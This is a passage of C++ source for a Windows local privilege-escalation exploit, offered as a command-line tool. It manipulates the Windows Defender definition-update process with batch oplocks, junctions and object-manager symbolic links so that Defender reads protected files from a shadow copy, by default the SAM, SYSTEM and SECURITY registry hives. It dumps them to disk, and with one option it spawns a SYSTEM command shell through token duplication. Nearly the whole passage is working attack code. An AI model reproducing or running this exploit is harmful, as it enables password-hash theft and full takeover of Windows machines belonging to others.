	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &htoken))
		return;
	
	SetPrivilege(htoken, SE_TCB_NAME, TRUE);
	SetPrivilege(htoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);
	SetPrivilege(htoken, SE_IMPERSONATE_NAME, TRUE);
	SetPrivilege(htoken, SE_DEBUG_NAME, TRUE);

	HANDLE hnewtoken = NULL;
	bool res = DuplicateTokenEx(htoken, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &hnewtoken);
	CloseHandle(htoken);
	if (!res)
		return;
	
	res = SetTokenInformation(hnewtoken, TokenSessionId, &sessionid, sizeof(DWORD));
	if (!res)
	{
		CloseHandle(hnewtoken);
		return;
	}

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	CreateProcessAsUser(hnewtoken, g_ShellBinary, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

	CloseHandle(hnewtoken);

	if (pi.hProcess)
		CloseHandle(pi.hProcess);
	if (pi.hThread)
		CloseHandle(pi.hThread);
	return;

}

struct AppOptions
{
	// Leak targets (max 3, because we only have 3 "known-opened" VDM filenames)
	std::vector<std::wstring> leakTargets;

	// Output handling
	std::wstring outDir;          // if set, write outputs here using source basename (or friendly name for known hives)
	std::wstring outFileSingle;   // if set and leakTargets.size()==1, write exactly to this path

	// Behavior toggles
	bool forceMode = false;       // skip Windows Update API check
	bool spawnCmdShell = false;   // launch cmd.exe after leaking (uses existing password-reset + logon trick)
	bool verbose = false;         // enable verbose/debug console output

	// Help
	bool showHelp = false;
};

static bool g_Verbose = false;
static void LogV(const char* fmt, ...)
{
	if (!g_Verbose)
		return;
	va_list ap;
	va_start(ap, fmt);
	vprintf(fmt, ap);
	va_end(ap);
}

static bool StartsWithI(const wchar_t* s, const wchar_t* prefix)
{
	if (!s || !prefix) return false;
	size_t n = wcslen(prefix);
	return _wcsnicmp(s, prefix, n) == 0;
}

static std::wstring BasenameOfPath(const std::wstring& p)
{
	if (p.empty()) return L"";
	const wchar_t* base = PathFindFileNameW(p.c_str());
	return base ? std::wstring(base) : p;
}

static std::wstring FriendlyNameForKnownHive(const std::wstring& target)
{
	// Normalize by checking suffix, so both "C:\Windows\...\SAM" and "\Windows\...\SAM" map.
	if (target.size() >= 3)
	{
		if (_wcsicmp(target.c_str() + (target.size() - 3), L"SAM") == 0) return L"SAM";
	}
	if (target.size() >= 6)
	{
		if (_wcsicmp(target.c_str() + (target.size() - 6), L"SYSTEM") == 0) return L"SYSTEM";
	}
	if (target.size() >= 8)
	{
		if (_wcsicmp(target.c_str() + (target.size() - 8), L"SECURITY") == 0) return L"SECURITY";
	}
	return L"";
}

static void PrintUsage()
{
	printf(
		"Usage:\n"
		"  FunnyApp.exe [options]\n\n"
		"Leak selection (max 3 targets per run):\n"
		"  --dump sam|system|security|all      Leak one or all registry hives (default: all)\n"
		"  --leak <path>                       Leak an arbitrary file (can be repeated, max 3)\n\n"
		"Output:\n"
		"  --out <path>                        Output path (only when leaking exactly 1 target)\n"
		"  --out-dir <dir>                     Output directory (writes <name>.bin by default)\n\n"
		"Actions:\n"
		"  --cmd                               Spawn an interactive cmd.exe after leaking (requires SAM)\n\n"
		"Other:\n"
		"  --force                             Skip Windows Update API check (download directly)\n"
		"  --verbose                           Enable verbose/debug console output\n"
		"  --help                              Show this help\n"
	);
}

static bool ParseArgs(int argc, wchar_t* argv[], AppOptions& opt)
{
	// Defaults
	opt.leakTargets.clear();

	auto addTarget = [&](const std::wstring& t) -> bool {
		if (t.empty()) return false;
		if (opt.leakTargets.size() >= 3) return false;
		opt.leakTargets.push_back(t);
		return true;
	};

	for (int i = 1; i < argc; i++)
	{
		if (_wcsicmp(argv[i], L"--help") == 0 || _wcsicmp(argv[i], L"-h") == 0 || _wcsicmp(argv[i], L"/?") == 0)
		{
			opt.showHelp = true;
			return true;
		}
		if (_wcsicmp(argv[i], L"--force") == 0)
		{
			opt.forceMode = true;
			continue;
		}
		if (_wcsicmp(argv[i], L"--cmd") == 0)
		{
			opt.spawnCmdShell = true;
			continue;
		}
		if (_wcsicmp(argv[i], L"--verbose") == 0 || _wcsicmp(argv[i], L"-v") == 0)
		{
			opt.verbose = true;
			continue;
		}
		if (_wcsicmp(argv[i], L"--dump") == 0)
		{
			if (i + 1 >= argc) return false;
			const wchar_t* which = argv[++i];
			if (_wcsicmp(which, L"all") == 0)
			{
				addTarget(L"\\Windows\\System32\\Config\\SAM");
				addTarget(L"\\Windows\\System32\\Config\\SYSTEM");
				addTarget(L"\\Windows\\System32\\Config\\SECURITY");
			}
			else if (_wcsicmp(which, L"sam") == 0)
			{
				addTarget(L"\\Windows\\System32\\Config\\SAM");
			}
			else if (_wcsicmp(which, L"system") == 0)
			{
				addTarget(L"\\Windows\\System32\\Config\\SYSTEM");
			}
			else if (_wcsicmp(which, L"security") == 0)
			{
				addTarget(L"\\Windows\\System32\\Config\\SECURITY");
			}
			else
			{
				return false;
			}
			continue;
		}
		if (_wcsicmp(argv[i], L"--leak") == 0)
		{
			if (i + 1 >= argc) return false;
			if (!addTarget(argv[++i])) return false;
			continue;
		}
		if (_wcsicmp(argv[i], L"--out") == 0)
		{
			if (i + 1 >= argc) return false;
			opt.outFileSingle = argv[++i];
			continue;
		}
		if (_wcsicmp(argv[i], L"--out-dir") == 0)
		{
			if (i + 1 >= argc) return false;
			opt.outDir = argv[++i];
			continue;
		}
	}

	// If no explicit leak selection was made, default to all three hives.
	if (opt.leakTargets.empty())
	{
		addTarget(L"\\Windows\\System32\\Config\\SAM");
		addTarget(L"\\Windows\\System32\\Config\\SYSTEM");
		addTarget(L"\\Windows\\System32\\Config\\SECURITY");
	}

	// Validate output args
	if (!opt.outFileSingle.empty() && opt.leakTargets.size() != 1)
		return false;

	return true;
}

int wmain(int argc, wchar_t* argv[])
{

	// Parse --shell flag early (needed by both SYSTEM service path and normal path)
	for (int i = 1; i < argc; i++)
	{
		if (_wcsicmp(argv[i], L"--shell") == 0)
		{
			g_ShellBinary = L"C:\\Windows\\System32\\cmd.exe";
		}
	}

	if (IsRunningAsLocalSystem())
	{
		//printf("Running as local system.\n");
		DWORD sessionid = 0;
		for (int i = 1; i < argc; i++)
		{
			// Session ID is a numeric argument
			DWORD val = _wtoi(argv[i]);
			if (val > 0) {
				sessionid = val;
				break;
			}
		}
		if (sessionid) {
			//printf("Session id : %d\n", sessionid);
			//printf("Shell binary : %ws\n", g_ShellBinary);
			LaunchConsoleInSessionId(sessionid);
		}
		return 0;
	}
	

	AppOptions opt;
	if (!ParseArgs(argc, argv, opt))
	{
		PrintUsage();
		return 0;
	}
	if (opt.showHelp)
	{
		PrintUsage();
		return 0;
	}
	g_Verbose = opt.verbose;

	// Each target is leaked via a different VDM filename in the same junction-redirected directory.
	// Defender opens these files during the update pass; we repoint them at our desired targets.
	const wchar_t* vdmfiles[] = { L"mpasbase.vdm", L"mpavbase.vdm", L"mpasdlta.vdm" };
	const int leakCount = (int)opt.leakTargets.size();
	wchar_t fullvsspath[MAX_PATH] = { 0 };
	HANDLE hreleaseready = NULL;
	wchar_t updtitle[0x200] = { 0 };
	wchar_t targetfile[MAX_PATH] = { 0 };
	wchar_t copiedfilepath[MAX_PATH] = { 0 };
	/*
	if (argc >= 2) {
		wcscpy(targetfile, argv[1]);
		//printf("Target file : \"%ws\"\n", targetfile);
	}
	else {
		
		wcscpy(targetfile, L"C:\\Windows\\System32\\Config\\ELAM");
		//printf("No source file specified, \"%ws\" will be used.\n", targetfile);
	}
	if (argc > 2) {
		wcscpy(copiedfilepath, argv[2]);
		//printf("Copy file path : \"%ws\"\n", copiedfilepath);
	}
	else
	{

		//printf("No file path was specified for file copy, \"%ws\" will be used.\n", copiedfilepath);
	}

	HANDLE hcheck = CreateFile(copiedfilepath, GENERIC_WRITE | DELETE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_DELETE_ON_CLOSE, NULL);
	if (!hcheck || hcheck == INVALID_HANDLE_VALUE)
	{
		//printf("Cannot open file to copy leaked file to, please specify a different path");
		return 0;
	}
	CloseHandle(hcheck);
	hcheck = CreateFile(targetfile, FILE_READ_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hcheck && hcheck != INVALID_HANDLE_VALUE)
	{
		//printf("Target file can be opened for read access, exiting.");
		CloseHandle(hcheck);
		return 0;
	}
	DWORD lasterr = GetLastError();
	if(lasterr == ERROR_FILE_NOT_FOUND || lasterr == ERROR_PATH_NOT_FOUND)
	{
		//printf("Target file does not exist.\n");
		return 0;
	}
	*/
	wchar_t nttargetfile[MAX_PATH] = { 0 };
	//wcscpy(nttargetfile, L"\\??\\");
	//wcscat(nttargetfile, targetfile);

	wchar_t* filestodel[100] = { 0 };
	HINTERNET hint = NULL;
	HINTERNET hint2 = NULL;
	char data[0x1000] = { 0 };
	DWORD index = 0;
	DWORD sz = sizeof(data);
	bool res2 = 0;
	wchar_t filesz[50] = { 0 };
	LARGE_INTEGER li = { 0 };
	GUID uid = { 0 };
	RPC_WSTR wuid = { 0 };
	wchar_t* wuid2 = 0;
	wchar_t envstr[MAX_PATH] = { 0 };
	wchar_t mpampath[MAX_PATH] = { 0 };
	HANDLE hmpap = NULL;
	void* exebuff = NULL;
	DWORD readsz = 0;
	HANDLE hmapping = NULL;
	void* mappedbuff = NULL;
	HRSRC hres = NULL;
	DWORD ressz = NULL;
	HGLOBAL cabbuff = NULL;
	wchar_t cabpath[MAX_PATH] = { 0 };
	wchar_t updatepath[MAX_PATH] = { 0 };
	HANDLE hcab = NULL;
	ERF erfstruct = { 0 };
	HFDI hcabctx = NULL;
	char _updatepath[MAX_PATH] = { 0 };
	bool extractres = false;
	char buff[0x1000] = { 0 };
	DWORD retbytes = 0;
	DWORD tid = 0;
	HANDLE hthread = NULL;
	WDRPCWorkerThreadArgs threadargs = { 0 };
	HANDLE hdir = NULL;
	wchar_t newdefupdatedirname[MAX_PATH] = { 0 };
	wchar_t updatelibpath[MAX_PATH] = { 0 };
	UNICODE_STRING unistrupdatelibpath = { 0 };
	OBJECT_ATTRIBUTES objattr = { 0 };
	IO_STATUS_BLOCK iostat = { 0 };
	HANDLE hupdatefile = NULL;
	NTSTATUS ntstat = 0;
	OVERLAPPED ovd = { 0 };
	DWORD transfersz = 0;
	wchar_t newname[MAX_PATH] = { 0 };
	DWORD renstructsz = 0;
	UNICODE_STRING objlinkname = { 0 };
	UNICODE_STRING objlinktarget = { 0 };
	FILE_RENAME_INFO* fri = 0;
	wchar_t wreparsedirpath[MAX_PATH] = { 0 };
	UNICODE_STRING reparsedirpath = { 0 };
	HANDLE hreparsedir = NULL;
	wchar_t newtmp[MAX_PATH] = { 0 };
	wchar_t rptarget[MAX_PATH] = { 0 };
	wchar_t printname[1] = { L'\0' };
	size_t targetsz = 0;
	size_t printnamesz = 0;
	size_t pathbuffersz = 0;
	size_t totalsz = 0;
	REPARSE_DATA_BUFFER* rdb = 0;
	DWORD cb = 0;
	OVERLAPPED ov = { 0 };
	bool ret = false;
	DWORD retsz = 0;
	HANDLE hleakedfile = NULL;
	HANDLE hobjlink = NULL;
	HANDLE hobjlinks[3] = { NULL, NULL, NULL };
	wchar_t sampath[MAX_PATH] = { 0 };
	LARGE_INTEGER _filesz = { 0 };
	OVERLAPPED ovd2 = { 0 };
	DWORD __readsz = 0;
	void* leakedfilebuff = 0;
	bool filelocked = false;
	bool needcabcleanup = false;
	bool dirmoved = false;
	bool needupdatedircleanup = false;
	UpdateFiles* UpdateFilesList = NULL;
	UpdateFiles* UpdateFilesListCurrent = NULL;
	bool isvssready = false;
	bool criterr = false;
	bool sawSam = false;
	int processresult = 1;


	try {

		if (opt.forceMode)
		{
			LogV("Force mode enabled — skipping Windows Update API check.\n");
			LogV("Downloading update files directly from Microsoft CDN...\n");
		}
		else
		{
			LogV("Checking for windows defender signature updates...\n");
			LogV("NOTE: Only signature/definition updates (KB2267602) are supported.\n");
			LogV("      Platform updates (KB4052623) will be skipped.\n");
			LogV("      Use --force to skip this check entirely.\n\n");
			while (!CheckForWDUpdates(updtitle, &criterr)) {

				if (criterr)
					goto cleanup;
				LogV("No signature definition updates found. Rechecking in 30 seconds...\n");
				Sleep(30000);

			}
			LogV("Found Update : \n%ws\n", updtitle);
		}

		UpdateFilesList = GetUpdateFiles();
		if (!UpdateFilesList)
		{
			goto cleanup;
		}
		LogV("Updates downloaded.\n");


		LogV("Creating VSS copy...\n");
		hreleaseready = CreateEvent(NULL, FALSE, FALSE, NULL);
		if (!hreleaseready)
		{
			//printf("Failed to create event error : %d\n", GetLastError());
			goto cleanup;
		}
			

		isvssready = TriggerWDForVS(hreleaseready, fullvsspath);
		if (!isvssready)
			goto cleanup;

		for (int x = 0; x < 1; x++) // single WD update pass — leak selected targets simultaneously (up to 3)
		{
			UpdateFilesListCurrent = UpdateFilesList;
			UuidCreate(&uid);
			UuidToStringW(&uid, &wuid);
			wuid2 = (wchar_t*)wuid;
			wcscpy(envstr, L"%TEMP%\\");
			wcscat(envstr, wuid2);
			ExpandEnvironmentStrings(envstr, updatepath, MAX_PATH);
			needupdatedircleanup = CreateDirectory(updatepath, NULL);
			if (!needupdatedircleanup)
			{
				//printf("Failed to create update directory, error : %d", GetLastError());
				goto cleanup;
			}
			LogV("Created update directory %ws\n", updatepath);
			while (UpdateFilesListCurrent)
			{
				wchar_t filepath[MAX_PATH] = { 0 };
				//wchar_t filename[MAX_PATH] = { 0 };
				wcscpy(filepath, updatepath);
				wcscat(filepath, L"\\");
				MultiByteToWideChar(CP_ACP, NULL, UpdateFilesListCurrent->filename, -1, &filepath[lstrlenW(filepath)], MAX_PATH - lstrlenW(filepath));


				HANDLE hupdate = CreateFile(filepath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, NULL, NULL);

				if (!hupdate || hupdate == INVALID_HANDLE_VALUE)
				{
					//printf("Failed to create update file, error : %d", GetLastError());
					goto cleanup;
				}
				UpdateFilesListCurrent->filecreated = true;
				DWORD writtenbytes = 0;
				if (!WriteFile(hupdate, UpdateFilesListCurrent->filebuff, UpdateFilesListCurrent->filesz, &writtenbytes, NULL))
				{
					//printf("Failed to write update file, error : %d", GetLastError());
					CloseHandle(hupdate);
					goto cleanup;
				}
				CloseHandle(hupdate);
				LogV("Created update file : %ws\n", filepath);
				UpdateFilesListCurrent = UpdateFilesListCurrent->next;

			}

			hdir = CreateFile(L"C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED, NULL);
			if (!hdir || hdir == INVALID_HANDLE_VALUE)
			{
				//printf("Failed to open definition updates directory, error : %d", GetLastError());
				goto cleanup;
			}

			threadargs.dirpath = updatepath;
			threadargs.hevent = CreateEvent(NULL, FALSE, FALSE, NULL);
			if (!threadargs.hevent)
			{
				LogV("CreateEvent for Defender RPC worker failed: %lu\n", GetLastError());
				goto cleanup;
			}

			LogV("Waiting for windows defender to create a new definition update directory...\n");
			wcscpy(newdefupdatedirname, L"C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\");
			do {
				ZeroMemory(buff, sizeof(buff));
				OVERLAPPED od = { 0 };
				od.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
				if (!od.hEvent)
				{
					LogV("CreateEvent for directory watcher failed: %lu\n", GetLastError());
					goto cleanup;
				}

				BOOL watchstarted = ReadDirectoryChangesW(hdir, buff, sizeof(buff), TRUE,
					FILE_NOTIFY_CHANGE_DIR_NAME, &retbytes, &od, NULL);
				DWORD watcherror = watchstarted ? ERROR_SUCCESS : GetLastError();
				if (!watchstarted && watcherror != ERROR_IO_PENDING)
				{
					LogV("ReadDirectoryChangesW failed: %lu\n", watcherror);
					CloseHandle(od.hEvent);
					goto cleanup;
				}

				// Arm the directory watcher before dispatching the RPC. Starting the
				// worker first can miss a fast directory creation and look like an
				// unexplained process exit when the RPC event wins the wait.
				if (!hthread)
				{
					hthread = CreateThread(NULL, NULL, WDCallerThread, (LPVOID)&threadargs, NULL, &tid);
					if (!hthread)
					{
						DWORD threaderror = GetLastError();
						CancelIo(hdir);
						GetOverlappedResult(hdir, &od, &retbytes, TRUE);
						CloseHandle(od.hEvent);
						LogV("CreateThread for Defender RPC worker failed: %lu\n", threaderror);
						goto cleanup;
					}
				}

				HANDLE events[2] = { od.hEvent, threadargs.hevent };
				DWORD waitresult = WaitForMultipleObjects(2, events, FALSE, INFINITE);
				if (waitresult == WAIT_OBJECT_0 + 1)
				{
					CancelIo(hdir);
					GetOverlappedResult(hdir, &od, &retbytes, TRUE);
					CloseHandle(od.hEvent);
					LogV("Defender RPC ended before a definition directory was created: return=0x%08lX, server_status=0x%08lX\n",
						(unsigned long)threadargs.res, (unsigned long)threadargs.serverstatus);
					goto cleanup;
				}
				if (waitresult != WAIT_OBJECT_0)
				{
					DWORD waiterror = GetLastError();
					CancelIo(hdir);
					GetOverlappedResult(hdir, &od, &retbytes, TRUE);
					CloseHandle(od.hEvent);
					LogV("WaitForMultipleObjects failed: result=0x%08lX, error=%lu\n",
						(unsigned long)waitresult, (unsigned long)waiterror);
					goto cleanup;
				}

				if (!GetOverlappedResult(hdir, &od, &retbytes, FALSE))
				{
					DWORD resultError = GetLastError();
					CloseHandle(od.hEvent);
					LogV("Directory notification completion failed: %lu\n", resultError);
					goto cleanup;
				}
				CloseHandle(od.hEvent);

				PFILE_NOTIFY_INFORMATION pfni = (PFILE_NOTIFY_INFORMATION)buff;
				PFILE_NOTIFY_INFORMATION added = NULL;
				for (;;)
				{
					if (pfni->Action == FILE_ACTION_ADDED)
					{
						added = pfni;
						break;
					}
					if (!pfni->NextEntryOffset)
						break;
					pfni = (PFILE_NOTIFY_INFORMATION)((BYTE*)pfni + pfni->NextEntryOffset);
				}
				if (!added)
					continue;

				size_t basenamechars = wcslen(newdefupdatedirname);
				size_t addedchars = added->FileNameLength / sizeof(wchar_t);
				if (basenamechars + addedchars >= MAX_PATH)
				{
					LogV("Definition update directory name is too long.\n");
					goto cleanup;
				}
				memcpy(newdefupdatedirname + basenamechars, added->FileName,
					addedchars * sizeof(wchar_t));
				newdefupdatedirname[basenamechars + addedchars] = L'\0';
				break;
			} while (1);
			LogV("Detected new definition update directory in %ws\n", newdefupdatedirname);

			wcscpy(updatelibpath, L"\\??\\");
			wcscat(updatelibpath, updatepath);
			wcscat(updatelibpath, L"\\mpasbase.vdm");

			RtlInitUnicodeString(&unistrupdatelibpath, updatelibpath);
			InitializeObjectAttributes(&objattr, &unistrupdatelibpath, OBJ_CASE_INSENSITIVE, NULL, NULL);

			ntstat = NtCreateFile(&hupdatefile, GENERIC_READ | DELETE | SYNCHRONIZE, &objattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, NULL, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_DELETE_ON_CLOSE, NULL, NULL);
			if (ntstat)
			{
				//printf("Failed to open update library, ntstatus : 0x%0.8X", ntstat);
				goto cleanup;
			}
			LogV("Setting oplock on %ws\n", updatelibpath);

			ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
			DeviceIoControl(hupdatefile, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ovd);

			if (GetLastError() != ERROR_IO_PENDING)
			{
				//printf("Failed to request a batch oplock on the update file, error : %d", GetLastError());
				goto cleanup;
			}
			LogV("Waiting for oplock to trigger...\n");
			GetOverlappedResult(hupdatefile, &ovd, &transfersz, TRUE);
			//printf("oplock triggered !\n");

			//

			wcscpy(newname, updatepath);
			wcscat(newname, L".WDFOO");
			renstructsz = sizeof(FILE_RENAME_INFO) + wcslen(newname) * sizeof(wchar_t) + sizeof(wchar_t);
			fri = (FILE_RENAME_INFO*)malloc(renstructsz);
			ZeroMemory(fri, renstructsz);
			fri->ReplaceIfExists = TRUE;
			fri->FileNameLength = wcslen(newname) * sizeof(wchar_t);
			wcscpy(&fri->FileName[0], newname);
			if (!SetFileInformationByHandle(hupdatefile, FileRenameInfo, fri, renstructsz))
			{
				//printf("Failed to move file from %ws to %ws error : %d", updatelibpath, newname, GetLastError());
				goto cleanup;
			}
			free(fri);
			fri = NULL;
			//printf("File moved  %ws to %ws\n", updatelibpath, newname);
			//


			wcscpy(newtmp, updatepath);
			wcscat(newtmp, L".foo");
			if (!MoveFile(updatepath, newtmp))
			{
				//printf("Failed to move %ws to %ws, error : %d", updatepath, newtmp, GetLastError());
				goto cleanup;
			}
			dirmoved = true;
			//printf("Directory moved %ws to %ws\n", updatepath, newtmp);

			wcscpy(wreparsedirpath, L"\\??\\");
			wcscat(wreparsedirpath, updatepath);

			RtlInitUnicodeString(&reparsedirpath, wreparsedirpath);
			InitializeObjectAttributes(&objattr, &reparsedirpath, OBJ_CASE_INSENSITIVE, NULL, NULL);

			ntstat = NtCreateFile(&hreparsedir, GENERIC_WRITE | DELETE | SYNCHRONIZE, &objattr, &iostat, NULL, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_CREATE, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT | FILE_DELETE_ON_CLOSE, NULL, NULL);
			if (ntstat)
			{
				//printf("Failed to recreate update directory, error : 0x%0.8X", ntstat);
				goto cleanup;
			}
			//printf("Recreated %ws\n", updatepath);


			wcscpy(rptarget, L"\\BaseNamedObjects\\Restricted");
			targetsz = wcslen(rptarget) * 2;
			printnamesz = 1 * 2;
			pathbuffersz = targetsz + printnamesz + 12;
			totalsz = pathbuffersz + REPARSE_DATA_BUFFER_HEADER_LENGTH;
			rdb = (REPARSE_DATA_BUFFER*)HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY, totalsz);
			rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
			rdb->ReparseDataLength = static_cast<USHORT>(pathbuffersz);
			rdb->Reserved = NULL;
			rdb->MountPointReparseBuffer.SubstituteNameOffset = NULL;
			rdb->MountPointReparseBuffer.SubstituteNameLength = static_cast<USHORT>(targetsz);
			memcpy(rdb->MountPointReparseBuffer.PathBuffer, rptarget, targetsz + 2);
			rdb->MountPointReparseBuffer.PrintNameOffset = static_cast<USHORT>(targetsz + 2);
			rdb->MountPointReparseBuffer.PrintNameLength = static_cast<USHORT>(printnamesz);
			memcpy(rdb->MountPointReparseBuffer.PathBuffer + targetsz / 2 + 1, printname, printnamesz);

			ov.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
			if (!ov.hEvent)
			{
				//printf("Failed to create event, error : %d", GetLastError());
				goto cleanup;
			}
			DeviceIoControl(hreparsedir, FSCTL_SET_REPARSE_POINT, rdb, totalsz, NULL, NULL, NULL, &ov);
			HeapFree(GetProcessHeap(), NULL, rdb);
			rdb = NULL;
			if (GetLastError() == ERROR_IO_PENDING) {
				GetOverlappedResult(hreparsedir, &ov, &retsz, TRUE);
			}
			if (GetLastError() != ERROR_SUCCESS)
			{
				//printf("Failed to create reparse point, error : %d", GetLastError());
				goto cleanup;
			}
			LogV("Junction created %ws => %ws\n", updatepath, rptarget);

			// Create one symlink per target while WD is frozen (oplock still held).
			for (int si = 0; si < leakCount; si++)
			{
				wchar_t objlinknamestr[MAX_PATH] = { 0 };
				wcscpy(objlinknamestr, L"\\BaseNamedObjects\\Restricted\\");
				wcscat(objlinknamestr, vdmfiles[si]);

				wchar_t nttargetfile_i[MAX_PATH] = { 0 };
				wcscpy(nttargetfile_i, fullvsspath);
				wcscat(nttargetfile_i, opt.leakTargets[si].c_str());

				UNICODE_STRING linkname_i = { 0 };
				UNICODE_STRING linktarget_i = { 0 };
				RtlInitUnicodeString(&linkname_i, objlinknamestr);
				RtlInitUnicodeString(&linktarget_i, nttargetfile_i);
				InitializeObjectAttributes(&objattr, &linkname_i, OBJ_CASE_INSENSITIVE, NULL, NULL);

				ntstat = _NtCreateSymbolicLinkObject(&hobjlinks[si], GENERIC_ALL, &objattr, &linktarget_i);
				if (ntstat)
				{
					//printf("Failed to create object manager symbolic link for %ws, error : 0x%0.8X\n", vdmfiles[si], ntstat);
					goto cleanup;
				}
				LogV("Object manager link created %ws => %ws\n", linkname_i.Buffer, linktarget_i.Buffer);
			}

			//TerminateThread(hthread, ERROR_SUCCESS); // kill the thread, don't care if it is still running
			//CloseHandle(hthread);
			//hthread = NULL;
			CloseHandle(ov.hEvent);
			ov.hEvent = NULL;
			CloseHandle(ovd.hEvent);
			ovd.hEvent = NULL;
			CloseHandle(hupdatefile);
			hupdatefile = NULL;


			CloseHandle(hdir);
			hdir = NULL;
			CloseHandle(hreparsedir);
			hreparsedir = NULL;

			// Read each leaked file in turn (WD follows each symlink as it processes the update).
			for (int ri = 0; ri < leakCount; ri++)
			{
				wchar_t readpath[MAX_PATH] = { 0 };
				wcscpy(readpath, newdefupdatedirname);
				wcscat(readpath, L"\\");
				wcscat(readpath, vdmfiles[ri]);

				do {
					hleakedfile = CreateFile(readpath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
				} while (hleakedfile == INVALID_HANDLE_VALUE || !hleakedfile);
				LogV("Leaked file opened %ws\n", readpath);

				GetFileSizeEx(hleakedfile, &_filesz);
				LockFileEx(hleakedfile, LOCKFILE_EXCLUSIVE_LOCK, NULL, _filesz.LowPart, _filesz.HighPart, &ovd2);
				filelocked = true;
				leakedfilebuff = malloc(_filesz.QuadPart);
				if (!leakedfilebuff)
				{
					//printf("Failed to allocate enough memory to copy leaked file !!!");
					goto cleanup;
				}

				if (!ReadFile(hleakedfile, leakedfilebuff, _filesz.QuadPart, &__readsz, NULL))
				{
					//printf("Failed to read file, error : %d\n", GetLastError());
					goto cleanup;
				}

				UnlockFile(hleakedfile, NULL, NULL, NULL, NULL);
				filelocked = false;
				CloseHandle(hleakedfile);
				hleakedfile = NULL;
				//printf("Read %d bytes\n", __readsz);

				ZeroMemory(copiedfilepath, sizeof(copiedfilepath));
				if (!opt.outFileSingle.empty())
				{
					wcscpy(copiedfilepath, opt.outFileSingle.c_str());
				}
				else if (!opt.outDir.empty())
				{
					std::wstring base = FriendlyNameForKnownHive(opt.leakTargets[ri]);
					if (base.empty())
						base = BasenameOfPath(opt.leakTargets[ri]);
					if (base.empty())
						base = L"leak";

					std::wstring out = opt.outDir;
					if (!out.empty() && out.back() != L'\\' && out.back() != L'/')
						out += L"\\";
					out += base;
					out += L".bin";
					wcscpy(copiedfilepath, out.c_str());
				}
				else
				{
					UuidCreate(&uid);
					UuidToStringW(&uid, &wuid);
					wuid2 = (wchar_t*)wuid;
					wchar_t env2[MAX_PATH] = { 0 };
					wcscpy(env2, L"%TEMP%\\");
					wcscat(env2, wuid2);
					ExpandEnvironmentStrings(env2, copiedfilepath, sizeof(copiedfilepath) / sizeof(wchar_t));
				}

				hleakedfile = CreateFile(copiedfilepath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
				if (!hleakedfile || hleakedfile == INVALID_HANDLE_VALUE)
				{
					//printf("Failed to create output file, error : %d", GetLastError());
					goto cleanup;
				}
				if (!WriteFile(hleakedfile, leakedfilebuff, _filesz.QuadPart, &__readsz, NULL))
				{
					//printf("Failed to write output file, error : %d", GetLastError());
					CloseHandle(hleakedfile);
					hleakedfile = NULL;
					DeleteFile(copiedfilepath);
					goto cleanup;
				}
				CloseHandle(hleakedfile);
				hleakedfile = NULL;
				free(leakedfilebuff);
				leakedfilebuff = NULL;

				if (hobjlinks[ri]) { CloseHandle(hobjlinks[ri]); hobjlinks[ri] = NULL; }

				std::wstring friendly = FriendlyNameForKnownHive(opt.leakTargets[ri]);
				if (friendly.empty())
					friendly = BasenameOfPath(opt.leakTargets[ri]);
				if (friendly.empty())
					friendly = L"leak";
				printf("%ws written at : %ws\n", friendly.c_str(), copiedfilepath);

				// Save SAM path for hash extraction and optional cmd shell spawning.
				if (!sawSam && FriendlyNameForKnownHive(opt.leakTargets[ri]) == L"SAM")
				{
					wcscpy(sampath, copiedfilepath);
					sawSam = true;
				}
			}

			//printf("Exploit succeeded.\n");
			SetEvent(hreleaseready);

			if (opt.spawnCmdShell)
			{
				if (!sawSam)
				{
					printf("WARNING: --cmd requested but SAM was not leaked in this run. Use `--dump sam` or `--dump all`.\n");
				}
				else
				{
					DoSpawnShellAsAllUsers(sampath);
				}
			}

			WaitForSingleObject(hthread, INFINITE);
			CloseHandle(hthread);
			hthread = NULL;
			CloseHandle(threadargs.hevent);
			threadargs.hevent = NULL;
			processresult = 0;


			
		}

	}
	catch (int exception)
	{
		goto cleanup;
	}

cleanup:
	if (hthread)
	{
		WaitForSingleObject(hthread, 5000);
		CloseHandle(hthread);
		hthread = NULL;
	}
	if (threadargs.hevent)
	{
		CloseHandle(threadargs.hevent);
		threadargs.hevent = NULL;
	}

	if(hint)
		InternetCloseHandle(hint);
	if(hint2)
		InternetCloseHandle(hint2);
	if (exebuff)
		free(exebuff);
	if (hcabctx)
		FDIDestroy(hcabctx);
	if (hdir)
		CloseHandle(hdir);
	if (fri)
		free(fri);
	if (rdb)
		HeapFree(GetProcessHeap(), NULL, rdb);
	if (ov.hEvent)
		CloseHandle(ov.hEvent);
